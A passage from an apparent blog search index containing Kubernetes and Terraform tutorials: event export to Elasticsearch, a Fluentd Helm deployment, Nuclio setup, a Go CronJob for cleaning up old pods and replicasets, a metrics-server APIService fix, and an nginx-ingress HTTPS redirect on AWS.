namespace = \u0026#34;kube-system\u0026#34; 5 } 6 data = { 7 \u0026#34;config.yaml\u0026#34; =\u0026lt;\u0026lt;-EOF 8 logLevel: error 9 logFormat: json 10 route: 11 routes: 12 - match: 13 - type: \u0026#34;Warning\u0026#34; 14 receiver: \u0026#34;dump\u0026#34; 15 - match: 16 - type: \u0026#34;Error\u0026#34; 17 receiver: \u0026#34;dump\u0026#34; 18 receivers: 19 - name: \u0026#34;dump\u0026#34; 20 file: 21 path: \u0026#34;dev/stderr\u0026#34; 22 EOF 23 } 24 25} In this config section, we decides collect the Error and Warning events only. And this component support for AWS ElasticSearch is not good, we output events directly to the Console, after which the ES are collected through Fluentdfluentd service\nThe Role.tfinclude the kubernetes RBAC config, used by deployments 1resource \u0026#34;kubernetes_cluster_role_binding\u0026#34; \u0026#34;event_export\u0026#34; { 2 metadata { 3 name = \u0026#34;event-export\u0026#34; 4 labels = { 5 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;event-export\u0026#34; 6 \u0026#34;app.kubernetes.io/managed-by\u0026#34; = \u0026#34;terraform\u0026#34; 7 } 8 } 9 role_ref { 10 api_group = \u0026#34;rbac.authorization.k8s.io\u0026#34; 11 kind = \u0026#34;ClusterRole\u0026#34; 12 name = \u0026#34;view\u0026#34; 13 } 14 subject { 15 kind = \u0026#34;ServiceAccount\u0026#34; 16 name = kubernetes_service_account.event_export.metadata[0].name 17 namespace = kubernetes_service_account.event_export.metadata[0].namespace 18 } 19 20 depends_on = [ 21 kubernetes_service_account.event_export 22 ] 23} 24 25resource \u0026#34;kubernetes_service_account\u0026#34; \u0026#34;event_export\u0026#34; { 26 automount_service_account_token = true 27 metadata { 28 name = \u0026#34;event-export\u0026#34; 29 namespace = \u0026#34;kube-system\u0026#34; 30 labels = { 31 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;event-export\u0026#34; 32 \u0026#34;app.kubernetes.io/managed-by\u0026#34; = \u0026#34;terraform\u0026#34; 33 } 34 } 35} Next search in kibana the search keyword is: kubernetes.labels.app:\u0026quot;event-export\u0026quot; AND log:\u0026quot;Warning\u0026quot; OR log:\u0026quot;Error\u0026quot;\n","link":"https://blog.wisekee.com/post/kubernetes-events-to-es/","section":"post","tags":["Terraform","K8s"],"title":"Kubernetes events collect to elasticsearch"},{"body":"step1 the main.tf include following contents: 1resource \u0026#34;helm_release\u0026#34; \u0026#34;fluentd_server\u0026#34; { 2 name = \u0026#34;fluentd-server\u0026#34; 3 repository = \u0026#34;https://charts.bitnami.com/bitnami\u0026#34; 4 # chart = \u0026#34;${path.module}/../../../../../charts/fluentd\u0026#34; 5 version = \u0026#34;3.1.0\u0026#34; 6 namespace = \u0026#34;kube-system\u0026#34; 7 8 values = [ 9 \u0026lt;\u0026lt;-EOF 10 forwarder: 11 configMap: \u0026#34;fluentd-forwarder-config\u0026#34; 12 rbac: 13 pspEnabled: true 14 resources: 15 limits: 16 memory: 1Gi 17 requests: 18 memory: 512Mi 19 aggregator: 20 replicaCount: 1 21 configMap: \u0026#34;fluentd-elasticsearch-config\u0026#34; 22 resources: 23 limits: 24 memory: 1Gi 25 requests: 26 memory: 512Mi 27 extraEnv: 28 - name: ELASTICSEARCH_HOST 29 value: \u0026#34;${var.es_url}\u0026#34; 30 - name: ELASTICSEARCH_PORT 31 value: \u0026#34;80\u0026#34; 32 - name: ELASTICSEARCH_SCHEME 33 value: \u0026#34;http\u0026#34; 34 persistence: 35 enabled: true 36 storageClass: gp2 37 EOF 38 ] 39 40 depends_on = [ 41 kubernetes_config_map.fluentd_elasticsearch_output, 42 kubernetes_config_map.fluentd_forwarder_config 43 ] 44 45} step2 the fluentd aggegator configmap config aggregator_configmap.tf 1resource \u0026#34;kubernetes_config_map\u0026#34; \u0026#34;fluentd_elasticsearch_output\u0026#34; { 2 metadata { 3 name = \u0026#34;fluentd-elasticsearch-config\u0026#34; 4 namespace = \u0026#34;kube-system\u0026#34; 5 } 6 data = { 7 \u0026#34;fluentd.conf\u0026#34; =\u0026lt;\u0026lt;-EOF 8 # Prometheus Exporter Plugin 9 # input plugin that exports metrics 10 \u0026lt;source\u0026gt; 11 @type prometheus 12 port 24231 13 \u0026lt;/source\u0026gt; 14 15 # input plugin that collects metrics from MonitorAgent 16 \u0026lt;source\u0026gt; 17 @type prometheus_monitor 18 \u0026lt;labels\u0026gt; 19 host $${hostname} 20 \u0026lt;/labels\u0026gt; 21 \u0026lt;/source\u0026gt; 22 23 # input plugin that collects metrics for output plugin 24 \u0026lt;source\u0026gt; 25 @type prometheus_output_monitor 26 \u0026lt;labels\u0026gt; 27 host $${hostname} 28 \u0026lt;/labels\u0026gt; 29 \u0026lt;/source\u0026gt; 30 31 # Ignore fluentd own events 32 \u0026lt;match fluent.**\u0026gt; 33 @type null 34 \u0026lt;/match\u0026gt; 35 36 # TCP input to receive logs from the forwarders 37 \u0026lt;source\u0026gt; 38 @type forward 39 bind 0.0.0.0 40 port 24224 41 \u0026lt;/source\u0026gt; 42 43 # HTTP input for the liveness and readiness probes 44 \u0026lt;source\u0026gt; 45 @type http 46 bind 0.0.0.0 47 port 9880 48 \u0026lt;/source\u0026gt; 49 50 # Throw the healthcheck to the standard output instead of forwarding it 51 \u0026lt;match fluentd.healthcheck\u0026gt; 52 @type stdout 53 \u0026lt;/match\u0026gt; 54 55 \u0026lt;filter **\u0026gt; 56 @type record_transformer 57 enable_ruby 58 \u0026lt;record\u0026gt; 59 env \u0026#34;${var.environment}\u0026#34; 60 \u0026lt;/record\u0026gt; 61 \u0026lt;/filter\u0026gt; 62 63 # Send the logs to the standard output 64 \u0026lt;match **\u0026gt; 65 @type elasticsearch_dynamic 66 include_tag_key true 67 host \u0026#34;#{ENV[\u0026#39;ELASTICSEARCH_HOST\u0026#39;]}\u0026#34; 68 port \u0026#34;#{ENV[\u0026#39;ELASTICSEARCH_PORT\u0026#39;]}\u0026#34; 69 scheme \u0026#34;#{ENV[\u0026#39;ELASTICSEARCH_SCHEME\u0026#39;]}\u0026#34; 70 reconnect_on_error true 71 reload_on_failure true 72 reload_connections false 73 logstash_format true 74 include_timestamp true 75 logstash_prefix eks-$${record[\u0026#39;kubernetes\u0026#39;][\u0026#39;namespace_name\u0026#39;]} 76 logstash_dateformat %Y-%m 77 78 \u0026lt;buffer\u0026gt; 79 @type file 80 path /opt/bitnami/fluentd/logs/buffers/logs.buffer 81 flush_thread_count 2 82 flush_interval 5s 83 retry_forever true 84 retry_max_interval 30 85 chunk_limit_size 2M 86 queue_limit_length 32 87 overflow_action block 88 \u0026lt;/buffer\u0026gt; 89 \u0026lt;/match\u0026gt; 90 \u0026lt;label @ERROR\u0026gt; 91 \u0026lt;match **\u0026gt; 92 @type stdout 93 \u0026lt;/match\u0026gt; 94 \u0026lt;/label\u0026gt; 95 EOF 96 } 97} step3 the fluentd forwarder configmap config file forwarder_configmap.tf 1resource \u0026#34;kubernetes_config_map\u0026#34; \u0026#34;fluentd_forwarder_config\u0026#34; { 2 metadata { 3 name = \u0026#34;fluentd-forwarder-config\u0026#34; 4 namespace = \u0026#34;kube-system\u0026#34; 5 } 6 data = { 7 \u0026#34;fluentd.conf\u0026#34; =\u0026lt;\u0026lt;-EOF 8 # Ignore fluentd own events 9 \u0026lt;match fluent.**\u0026gt; 10 @type null 11 \u0026lt;/match\u0026gt; 12 13 # HTTP input for the liveness and readiness probes 14 \u0026lt;source\u0026gt; 15 @type http 16 port 9880 17 \u0026lt;/source\u0026gt; 18 19 # Throw the healthcheck to the standard output instead of forwarding it 20 \u0026lt;match fluentd.healthcheck\u0026gt; 21 @type stdout 22 \u0026lt;/match\u0026gt; 23 24 # Get the logs from the containers running in the node 25 \u0026lt;source\u0026gt; 26 @type tail 27 path /var/log/containers/*.log 28 # exclude Fluentd logs 29 exclude_path /var/log/containers/*fluentd*.log 30 pos_file /opt/bitnami/fluentd/logs/buffers/fluentd-docker.pos 31 tag eks.* 32 read_from_head true 33 \u0026lt;parse\u0026gt; 34 @type json 35 # @type regexp 36 # expression /^(?\u0026lt;time\u0026gt;.+) (?\u0026lt;stream\u0026gt;stdout|stderr) [^ ]* (?\u0026lt;log\u0026gt;.*)$/ 37 time_format %Y-%m-%dT%H:%M:%S.%NZ 38 \u0026lt;/parse\u0026gt; 39 \u0026lt;/source\u0026gt; 40 41 # enrich with kubernetes metadata 42 \u0026lt;filter eks.**\u0026gt; 43 @type kubernetes_metadata 44 \u0026lt;/filter\u0026gt; 45 46 # Forward all logs to the aggregators 47 \u0026lt;match eks.**\u0026gt; 48 @type forward 49 \u0026lt;server\u0026gt; 50 host fluentd-server-headless.kube-system.svc.cluster.local 51 port 24224 52 \u0026lt;/server\u0026gt; 53 54 \u0026lt;buffer\u0026gt; 55 @type file 56 path /opt/bitnami/fluentd/logs/buffers/logs.buffer 57 flush_thread_count 2 58 flush_interval 5s 59 \u0026lt;/buffer\u0026gt; 60 \u0026lt;/match\u0026gt; 61 EOF 62 } 63} ","link":"https://blog.wisekee.com/post/terraform-helm-fluentd/","section":"post","tags":["Terraform","K8s","Fluentd"],"title":"Terraform+Helm release+fluentd in kubernetes"},{"body":" use Helm charts: Github 1\thelm repo add nuclio https://nuclio.github.io/nuclio/charts 2\tkubectl create namespace nuclio copy registry to nuclio namespace from existing namespace 1kubectl get secret repo-registry -n dev-ns -o yaml \\ 2| sed s/\u0026#34;namespace: dev-ns\u0026#34;/\u0026#34;namespace: nuclio\u0026#34;/ \\ 3| kubectl apply -f - install nuclio 1\thelm install nuclio \\ 2 --set registry.secretName=repo-registry \\ 3 --set registry.pushPullUrl=localhost/nucalio \\ 4 nuclio/nuclio -n nuclio visit dashboard 1\tkubectl -n nuclio port-forward $(kubectl get pods -n nuclio -l nuclio.io/app=dashboard -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39;) 8070:8070 testing the function in nuclio console web ui 1package main 2 3import ( 4 \u0026#34;github.com/nuclio/nuclio-sdk-go\u0026#34; 5) 6 7func Handler(context *nuclio.Context, event nuclio.Event) (interface{}, error) { 8 context.Logger.Info(\u0026#34;This is an unstrucured %s\u0026#34;, \u0026#34;log\u0026#34;) 9 10\treturn nuclio.Response{ 11\tStatusCode: 200, 12\tContentType: \u0026#34;application/text\u0026#34;, 13\tBody: []byte(\u0026#34;Hello, from Nuclio :]. Okay let me change and update somethings\u0026#34;), 14\t}, nil 15} ","link":"https://blog.wisekee.com/post/getting-stared-nucalio/","section":"post","tags":["Kubernetes","Nuclio","Serverless"],"title":"Getting started Serverless framework Nuclio"},{"body":"","link":"https://blog.wisekee.com/tags/nuclio/","section":"tags","tags":null,"title":"Nuclio"},{"body":"","link":"https://blog.wisekee.com/tags/serverless/","section":"tags","tags":null,"title":"Serverless"},{"body":"Prepare Golang program code use clean up unused pods and replicaset resources in kubernetes we can clean up not running status pods and deactive replicasets\ninitialization Go lanugage project evnironment 1\tmkdir k8s_res_cleanup \u0026amp;\u0026amp; cd k8s_res_cleanup 2\tgo mod init example.com/cleanup/resources 3\tgo get -v -u k8s.io/client-go@v0.18.2 # install packages 4\tgo get -v -u github.com/prometheus/common@v0.1.0 create sub packageconfig/k8s.go indicate how can connect to kubernetes cluster 1package config 2 3import ( 4\t\u0026#34;flag\u0026#34; 5\tlogs \u0026#34;github.com/prometheus/common/log\u0026#34; 6\t\u0026#34;k8s.io/client-go/kubernetes\u0026#34; 7\t\u0026#34;k8s.io/client-go/rest\u0026#34; 8\t\u0026#34;k8s.io/client-go/tools/clientcmd\u0026#34; 9\t\u0026#34;os\u0026#34; 10\t\u0026#34;path/filepath\u0026#34; 11) 12 13type K8s struct { 14\tClient kubernetes.Interface 15\tConfig *rest.Config 16} 17 18// NewK8s will provide a new k8s client interface 19// resolves where it is running whether inside the kubernetes cluster or outside 20// While running outside of the cluster, tries to make use of the kubeconfig file 21// While running inside the cluster resolved via pod environment uses the in-cluster config 22func NewK8s() (*K8s, error) { 23\tclient := K8s{} 24\tif _, inCluster := os.LookupEnv(\u0026#34;KUBERNETES_SERVICE_HOST\u0026#34;); inCluster == true { 25\tlogs.Info(\u0026#34;Program running inside the cluster, picking the in-cluster configuration\u0026#34;) 26 27\tconfig, err := rest.InClusterConfig() 28\tif err != nil { 29\treturn nil, err 30\t} 31\tclient.Client, err = kubernetes.NewForConfig(config) 32\tclient.Config = config 33\tif err != nil { 34\treturn nil, err 35\t} 36\treturn \u0026amp;client, nil 37\t} 38 39\tlogs.Info(\u0026#34;Program running from outside of the cluster\u0026#34;) 40\tvar kubeconfig *string 41\tif home := homeDir(); home != \u0026#34;\u0026#34; { 42\tkubeconfig = flag.String(\u0026#34;kubeconfig\u0026#34;, filepath.Join(home, \u0026#34;.kube\u0026#34;, \u0026#34;config\u0026#34;), \u0026#34;(optional) absolute path to the kubeconfig file\u0026#34;) 43\t} else { 44\tkubeconfig = flag.String(\u0026#34;kubeconfig\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;absolute path to the kubeconfig file\u0026#34;) 45\t} 46\tflag.Parse() 47\tconfig, err := clientcmd.BuildConfigFromFlags(\u0026#34;\u0026#34;, *kubeconfig) 48\tif err != nil { 49\treturn nil, err 50\t} 51\tclient.Client, err = kubernetes.NewForConfig(config) 52\tif err != nil { 53\treturn nil, err 54\t} 55\tclient.Config = config 56\treturn \u0026amp;client, nil 57} 58 59func homeDir() string { 60\tif h := os.Getenv(\u0026#34;HOME\u0026#34;); h != \u0026#34;\u0026#34; { 61\treturn h 62\t} 63\treturn os.Getenv(\u0026#34;USERPROFILE\u0026#34;) 64} create and fill code to main.go 1package main 2 3import ( 4\t\u0026#34;flag\u0026#34; 5\tlogs \u0026#34;github.com/prometheus/common/log\u0026#34; 6\t\u0026#34;snc.com/cleanup/resources/resources\u0026#34; 7\t\u0026#34;strings\u0026#34; 8) 9 10var ( 11\tnamespace string 12\tdryRun bool 13\texpirationDays int 14\tresourceType string 15) 16 17func init() { 18\tconst ( 19\tDefaultNamespace = \u0026#34;\u0026#34; 20\tDefaultDryRun = false 21\tDefaultExpirationDays = 100 22\tDefaultResourceType = \u0026#34;pod\u0026#34; 23\t) 24\tflag.StringVar(\u0026amp;namespace, \u0026#34;namespace\u0026#34;, DefaultNamespace, \u0026#34;the namespace for cleanup resources\u0026#34;) 25\tflag.BoolVar(\u0026amp;dryRun, \u0026#34;dry_run\u0026#34;, DefaultDryRun, \u0026#34;indicate whether dry run\u0026#34;) 26\tflag.IntVar(\u0026amp;expirationDays, \u0026#34;expire_day\u0026#34;, DefaultExpirationDays, \u0026#34;the expiration days to be cleanup resources\u0026#34;) 27\tflag.StringVar(\u0026amp;resourceType, \u0026#34;resource_type\u0026#34;, DefaultResourceType, \u0026#34;Which resource cleanup enabled\u0026#34;) 28} 29 30func main() { 31\tflag.Parse() 32\tresources.InitClient(dryRun, expirationDays, namespace) 33\tlogs.Info(\u0026#34;The pass arguments is namespace: \u0026#34;, namespace, \u0026#34; dry_run: \u0026#34;, dryRun, \u0026#34; expire_day:\u0026#34;, expirationDays, 34\t\u0026#34; resource_type: \u0026#34;, resourceType) 35\tlogs.Info(\u0026#34;Start delete expire resources:\u0026#34;) 36\tresourceType = strings.ToLower(resourceType) 37\tresources.CleanUp(resourceType) 38} create resources/init.go sub packages the contents like following 1package resources 2 3import ( 4\tlogs \u0026#34;github.com/prometheus/common/log\u0026#34; 5\t\u0026#34;k8s.io/client-go/kubernetes\u0026#34; 6\t\u0026#34;snc.com/cleanup/resources/config\u0026#34; 7\t\u0026#34;strings\u0026#34; 8\t\u0026#34;sync\u0026#34; 9\t\u0026#34;time\u0026#34; 10) 11 12var ( 13\tclient kubernetes.Interface 14\tlistLimit int64 = 50 15\tdryRun []string 16\texpireDays int 17\tnamespace string 18\twg sync.WaitGroup 19\tcleanMap = map[string]func(w *sync.WaitGroup){ 20\t\u0026#34;pod\u0026#34;: func(w *sync.WaitGroup) { 21\tlogs.Info(\u0026#34;====== Start clean up pods ======= \u0026#34;) 22\tdefer w.Done() 23\tcleanUpExpiredPods(\u0026#34;\u0026#34;) 24\t}, 25\t\u0026#34;replicaset\u0026#34;: func(w *sync.WaitGroup) { 26\tlogs.Info(\u0026#34;====== Start clean up replicaset ======= \u0026#34;) 27\tdefer w.Done() 28\tcleanUpExpiredRS(\u0026#34;\u0026#34;) 29\t}, 30\t\u0026#34;airflow\u0026#34;: func(w *sync.WaitGroup) { 31\tlogs.Info(\u0026#34;====== Start clean up airflow logs ======= \u0026#34;) 32\t}, 33\t} 34) 35 36func InitClient(testing bool, expires int, ns string) { 37\tk8sClient, err := config.NewK8s() 38\texpireDays = expires 39\tnamespace = ns 40\tif err != nil { 41\tlogs.Fatal(\u0026#34;Init kubernetes error.\u0026#34;, err) 42\t} 43\tclient = k8sClient.Client 44\tif testing { 45\tdryRun = []string{\u0026#34;All\u0026#34;} 46\t} 47} 48 49func CleanUp(resourceType string) { 50\trt := strings.Split(resourceType, \u0026#34;,\u0026#34;) 51\tfor _, v := range rt { 52\tv = strings.TrimSpace(v) 53\tif _, ok := cleanMap[v]; ok { 54\twg.Add(1) 55\tgo cleanMap[v](\u0026amp;wg) 56\t} 57\t} 58\twg.Wait() 59\tlogs.Info(\u0026#34;CleanUp Done!\u0026#34;) 60} 61 62func daysAgo(sourceTime time.Time) int { 63\treturn int(time.Now().UTC().Sub(sourceTime).Hours() / 24) 64} the resources/pods.go like following this 1package resources 2 3import ( 4\t\u0026#34;context\u0026#34; 5\tlogs \u0026#34;github.com/prometheus/common/log\u0026#34; 6\tv1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; 7) 8 9var podsFieldsOpts = \u0026#34;status.phase!=Running\u0026#34; 10 11func cleanUpExpiredPods(goOn string) { 12\tlst, err := client.CoreV1().Pods(namespace).List( 13\tcontext.TODO(), 14\tv1.ListOptions{ 15\tFieldSelector: podsFieldsOpts, 16\tLimit: listLimit, 17\tContinue: goOn, 18\t}, 19\t) 20\tif err != nil { 21\tlogs.Error(\u0026#34;has error list pods:\u0026#34;, err.Error()) 22\t} 23\tfor _, item := range lst.Items { 24\tdays := daysAgo(item.CreationTimestamp.UTC()) 25\tif days \u0026gt;= expireDays { 26\terr := deletePodByName(item.Name, item.Namespace) 27\tif err != nil { 28\tlogs.Error(\u0026#34;Delete Pod\u0026#34;, item.Name, \u0026#34; has error: \u0026#34;, err.Error()) 29\t} 30\tlogs.Info(\u0026#34;Delete Pod The Name: \u0026#34;, item.Name, \u0026#34; NameSpace: \u0026#34;, item.Namespace, \u0026#34; Status: \u0026#34;, 31\titem.Status.Phase, \u0026#34; Age:\u0026#34;, days, \u0026#34;d\u0026#34;) 32\t} 33\t} 34\tif lst.Continue != \u0026#34;\u0026#34; { 35\tcleanUpExpiredPods(lst.Continue) 36\t} 37} 38 39func deletePodByName(name string, ns string) error { 40\tdeletePolicy := v1.DeletePropagationForeground 41\treturn client.CoreV1().Pods(ns).Delete(context.TODO(), name, v1.DeleteOptions{ 42\tPropagationPolicy: \u0026amp;deletePolicy, 43\tDryRun: dryRun, 44\t}) 45} And resources/replicasets.go clean up the unuse replicasets resource 1package resources 2 3import ( 4\t\u0026#34;context\u0026#34; 5\tlogs \u0026#34;github.com/prometheus/common/log\u0026#34; 6\tv12 \u0026#34;k8s.io/api/apps/v1\u0026#34; 7\tv1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; 8) 9 10func cleanUpExpiredRS(goOn string) { 11\tlstOps := v1.ListOptions{ 12\tLimit: listLimit, 13\tContinue: goOn, 14\t} 15\tlstRs, err := client.AppsV1().ReplicaSets(namespace).List(context.TODO(), lstOps) 16\tif err != nil { 17\tlogs.Fatal(\u0026#34;Get Resource has error: \u0026#34;, err.Error()) 18\t} 19\tif lstRs != nil { 20\tfor _, item := range lstRs.Items { 21\tdays := daysAgo(item.CreationTimestamp.UTC()) 22\tif matchCondition(days, item) { 23\terr := deleteRSByName(item.Name, item.Namespace) 24\tif err != nil { 25\tlogs.Error(\u0026#34;Delete replicaset\u0026#34;, item.Name, \u0026#34; has error\u0026#34;, err) 26\t} 27\tlogs.Info(\u0026#34;Delete the replicaset Name: \u0026#34;, item.Name, \u0026#34; Namespace: \u0026#34;, item.Namespace, \u0026#34; Replicas: \u0026#34;, 28\titem.Status.Replicas, \u0026#34; Ready: \u0026#34;, item.Status.ReadyReplicas, \u0026#34; Available: \u0026#34;, 29\titem.Status.AvailableReplicas, \u0026#34; Age: \u0026#34;, days, \u0026#34;d\u0026#34;) 30\t} 31\t} 32\tif lstRs.Continue != \u0026#34;\u0026#34; { 33\tcleanUpExpiredRS(lstRs.Continue) 34\t} 35\t} 36} 37 38func matchCondition(days int, item v12.ReplicaSet) bool { 39\tif days \u0026gt;= expireDays \u0026amp;\u0026amp; item.Status.Replicas == 0 \u0026amp;\u0026amp; 40\titem.Status.ReadyReplicas == 0 \u0026amp;\u0026amp; item.Status.AvailableReplicas == 0 { 41\treturn true 42\t} 43\treturn false 44} 45 46func deleteRSByName(name string, ns string) error { 47\tdeletePolicy := v1.DeletePropagationForeground 48\treturn client.AppsV1().ReplicaSets(ns).Delete(context.TODO(), name, v1.DeleteOptions{ 49\tDryRun: dryRun, 50\tPropagationPolicy: \u0026amp;deletePolicy, 51\t}) 52} Then create Dockerfile build and construct the docker image, use to kubernetes cronjob task scheduler 1FROM golang:alpine AS build-env 2RUN mkdir /go/src/app \u0026amp;\u0026amp; apk update \u0026amp;\u0026amp; apk add git 3ADD . /go/src/app/ 4WORKDIR /go/src/app 5RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags \u0026#39;-extldflags \u0026#34;-static\u0026#34;\u0026#39; -o cleanup . 6 7FROM scratch 8WORKDIR /app 9COPY --from=build-env /go/src/app/cleanup . 10CMD [\u0026#34;./cleanup\u0026#34;, \u0026#34;--dry_run\u0026#34;] At end create kubernetes resource yaml file to definition cronjob resource, schedule the clean up job 1--- 2apiVersion: rbac.authorization.k8s.io/v1 3kind: ClusterRole 4metadata: 5 name: k8s-cleanup-resource 6rules: 7 - apiGroups: [\u0026#34;\u0026#34;, \u0026#34;extension\u0026#34;, \u0026#34;apps\u0026#34;] 8 resources: [\u0026#34;pods\u0026#34;, \u0026#34;replicasets\u0026#34;] 9 verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;delete\u0026#34;] 10--- 11apiVersion: v1 12kind: ServiceAccount 13metadata: 14 name: k8s-cleanup-resource 15 namespace: kube-system 16--- 17apiVersion: rbac.authorization.k8s.io/v1 18kind: ClusterRoleBinding 19metadata: 20 name: k8s-cleanup-resource 21roleRef: 22 kind: ClusterRole 23 name: k8s-cleanup-resource 24 apiGroup: rbac.authorization.k8s.io 25subjects: 26 - kind: ServiceAccount 27 name: \u0026#34;k8s-cleanup-resource\u0026#34; 28 namespace: kube-system 29 30--- 31apiVersion: batch/v1beta1 32kind: CronJob 33metadata: 34 name: cleanup-resources 35 namespace: kube-system 36spec: 37 schedule: \u0026#34;0 15 * * *\u0026#34; 38 concurrencyPolicy: Allow 39 startingDeadlineSeconds: 10 40 successfulJobsHistoryLimit: 3 41 failedJobsHistoryLimit: 3 42 suspend: false 43 jobTemplate: 44 spec: 45 template: 46 spec: 47 securityContext: 48 runAsUser: 50000 49 runAsgGroup: 50000 50 fsGroup: 65534 51 containers: 52 - name: cleanup-resources 53 image: \u0026#39;localhost.reg/library/cleanup-resource:latest\u0026#39; 54 command: 55 - \u0026#34;./cleanup\u0026#34; 56 args: 57 - \u0026#34;--expire_day\u0026#34; 58 - \u0026#34;5\u0026#34; 59 - \u0026#34;--resource_type\u0026#34; 60 - \u0026#34;pod,replicaset\u0026#34; 61 resources: 62 limits: 63 memory: 200Mi 64 requests: 65 memory: 50Mi 66 restartPolicy: OnFailure 67 serviceAccountName: k8s-cleanup-resource 68 imagePullSecrets: 69 - name: k8s-registry ","link":"https://blog.wisekee.com/post/schedule-cleanup-k8s-resources/","section":"post","tags":["Kubernetes","Go"],"title":"Scheduler clean up kubernetes unuseful resources"},{"body":"","link":"https://blog.wisekee.com/tags/kubectl/","section":"tags","tags":null,"title":"kubectl"},{"body":"When we repeatedly install the Metrics-Server, because we use helm to install it, deleting one of them will cause the following error when executing the command related to kubectl top nodes: Error from server (NotFound): the server could not find the requested resource (get services http:heapster:)\nA large part of this is due to the removal of the Apiservice Resources from Metics, when you execute the following command to ensure that the Apiservice exists kubectl get apiservice | grep metrics v1beta1.metrics.k8s.io kube-system/metrics-server True 4d6h\nCheck to see if you can find the correct Apiservice and register the correct Service name below Namespace. If not, you can simply create an Apiservice YAML file that points to the correct Metrics- Server Service 1apiVersion: apiregistration.k8s.io/v1 2kind: APIService 3metadata: 4 labels: 5 k8s-app: metrics-server 6 name: v1beta1.metrics.k8s.io 7spec: 8 group: metrics.k8s.io 9 groupPriorityMinimum: 100 10 insecureSkipTLSVerify: true 11 service: 12 name: metrics-server # Replace correct metrics-server\u0026#39;s service name in namespace 13 namespace: kube-system 14 version: v1beta1 15 versionPriority: 100 Rerequest the resource and execute the following command kubectl apply -f metrics-apiservice.yaml ","link":"https://blog.wisekee.com/post/k8s-metrics-server/","section":"post","tags":["k8s","kubectl","kubernetes","featured"],"title":"Solve the problem of Metrics - Server"},{"body":"Append the nginx ingress http redirect to https Add extra port to nginx deployment for example: 8080, look like following 1ports: 2 - name: http 3 containerPort: 80 4 protocol: TCP 5 - name: https 6 containerPort: 443 7 protocol: TCP 8 - name: webhook 9 containerPort: 8443 10 protocol: TCP 11 - name: http-redirect 12 containerPort: 8080 Add section http-snippet to ConfigMap ingress-nginx-controller 1data: 2 allow-snippet-annotations: \u0026#39;true\u0026#39; 3 compute-full-forwarded-for: \u0026#39;true\u0026#39; 4 use-forwarded-headers: \u0026#39;true\u0026#39; 5 server-tokens: \u0026#39;false\u0026#39; 6 http-snippet: | 7 server { 8 listen 8080; 9 return 308 https://$host$request_uri; 10 } Modify the ingress service loadbalance configure, let http-80 forward to http-redirect-8080 1- name: http 2 protocol: TCP 3 appProtocol: http 4 port: 80 5 targetPort: http-redirect 6 nodePort: 32009 Using Nginx-Ingress Controller in AWS Eks environment Need manually enable the Proxy protocol V2 in NLB target group just only TCP https 443 listener Rather than TCP http 80 listener Multiple SSL certificate need manually add to NLB The http redirect to https, need to change some paramets 1\t# use http-snippet and open proxy protocol 2 use-proxy-protocol: \u0026#39;true\u0026#39; 3 use-forwarded-headers: \u0026#39;true\u0026#39; 4 server-tokens: \u0026#39;false\u0026#39; 5 http-snippet: | 6 server { 7 listen 8000; 8 return 308 https://$host$request_uri; 9 } 10 proxy-real-ip-cidr: ${join(\u0026#34;,\u0026#34;, var.internal_cidr)} 11 # Add special port in controller container 12 set { 13 type = \u0026#34;string\u0026#34; 14 name = \u0026#34;controller.containerPort.special\u0026#34; 15 value = \u0026#34;8000\u0026#34; 16 } 17 # Let https redirect to http port and http port redirect to special port , the special port listener in `http-snippet` section 18 set { 19 type = \u0026#34;string\u0026#34; 20 name = \u0026#34;controller.service.targetPorts.https\u0026#34; 21 value = \u0026#34;http\u0026#34; 22 } 23 24set { 25type = \u0026#34;string\u0026#34; 26name = \u0026#34;controller.service.targetPorts.http\u0026#34; 27value = \u0026#34;special\u0026#34; 28} The complete Terraform configuration is shown below 1\tresource \u0026#34;helm_release\u0026#34; \u0026#34;ingress_nginx_controller\u0026#34; { 2 name = \u0026#34;nginx-ingress-controller\u0026#34; 3 repository = \u0026#34;https://kubernetes.github.io/ingress-nginx\u0026#34; 4 chart = \u0026#34;ingress-nginx\u0026#34; 5 version = \u0026#34;3.8.0\u0026#34; 6 namespace = \u0026#34;kube-system\u0026#34; 7 8 values = [ 9 \u0026lt;\u0026lt;-EOF 10 controller: 11 config: 12 use-proxy-protocol: \u0026#39;true\u0026#39; 13 use-forwarded-headers: \u0026#39;true\u0026#39; 14 server-tokens: \u0026#39;false\u0026#39; 15 http-snippet: | 16 server { 17 listen 8000; 18 return 308 https://$host$request_uri; 19 } 20 proxy-real-ip-cidr: ${join(\u0026#34;,\u0026#34;, var.internal_cidr)} 21 EOF 22 ] 23 24 set { 25 type = \u0026#34;string\u0026#34; 26 name = \u0026#34;controller.resources.requests.memory\u0026#34; 27 value = \u0026#34;256Mi\u0026#34; 28 } 29 30 set { 31 type = \u0026#34;string\u0026#34; 32 name = \u0026#34;controller.resources.limits.memory\u0026#34; 33 value = \u0026#34;500Mi\u0026#34; 34 } 35 36 set { 37 name = \u0026#34;fullnameOverride\u0026#34; 38 value = \u0026#34;nginx-ingress\u0026#34; 39 } 40 41 set { 42 type = \u0026#34;string\u0026#34; 43 name = \u0026#34;controller.service.targetPorts.https\u0026#34; 44 value = \u0026#34;http\u0026#34; 45 } 46 47 set { 48 type = \u0026#34;string\u0026#34; 49 name = \u0026#34;controller.service.targetPorts.http\u0026#34; 50 value = \u0026#34;special\u0026#34; 51 } 52 53 dynamic \u0026#34;set\u0026#34; { 54 for_each = concat(var.office_cidr, var.internal_cidr) 55 content { 56 name = join(\u0026#34;\u0026#34;, [\u0026#34;controller.service.loadBalancerSourceRanges[\u0026#34;, set.key, \u0026#34;]\u0026#34;]) 57 value = set.value 58 } 59 } 60 61 set { 62 type = \u0026#34;string\u0026#34; 63 name = \u0026#34;controller.containerPort.special\u0026#34; 64 value = \u0026#34;8000\u0026#34; 65 } 66 67 set { 68 type = \u0026#34;string\u0026#34; 69 name = \u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-ssl-cert\u0026#34; 70 value = var.alb_certificate 71 } 72 73 set { 74 type = \u0026#34;string\u0026#34; 75 name = 